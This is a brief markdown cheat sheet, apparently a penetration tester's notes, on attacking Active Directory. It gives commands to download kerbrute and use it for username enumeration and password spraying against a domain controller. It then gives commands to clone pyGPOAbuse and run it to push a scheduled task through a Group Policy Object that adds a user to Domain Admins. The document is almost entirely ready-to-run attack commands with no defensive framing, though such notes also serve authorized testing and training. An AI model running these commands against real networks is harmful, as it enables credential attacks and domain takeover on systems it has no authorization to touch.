# AD attacks

## Tools
https://www.kali.org/tools/kerberoast/

## Kerbrute Install and use
### Install
```
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
```
```
mv kerbrute_linux_amd64 kerbrute
```
```
chmod +x kerbrute
```
```
sudo mv kerbrute /usr/local/bin/
```
### Use
```
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```
```
kerbrute passwordspray -d domain.local users.txt Password123
```
## PyGPOAbuse
```
git clone https://github.com/Hackndo/pyGPOAbuse
```

```
python3 pygpoabuse.py 'domain.com/user:password' \
-gpo-id 'SID' \
-taskname 'webdev_disable' \
-dc-ip $target \
-powershell 'net group "Domain Admins" User /add'
```
